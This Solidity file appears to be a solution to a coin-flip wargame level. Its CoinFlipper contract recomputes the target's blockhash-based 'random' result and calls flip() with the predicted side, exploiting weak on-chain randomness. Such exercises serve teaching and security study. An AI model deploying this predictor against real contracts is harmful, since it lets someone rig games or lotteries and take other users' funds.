pragma solidity ^0.4.24;

contract CoinFlip {
    function flip(bool _guess) public returns (bool);
}

contract CoinFlipper {
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function flipCoin(address coinContract) public {
        uint256 blockValue = uint256(block.blockhash(block.number-1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        
        // calling contract with low level call()
        //coinContract.call(bytes4(keccak256("flip(bool)")), side);
        
        // calling contract with an interface
        CoinFlip contractToCall = CoinFlip(coinContract);
        contractToCall.flip(side);
    }
}

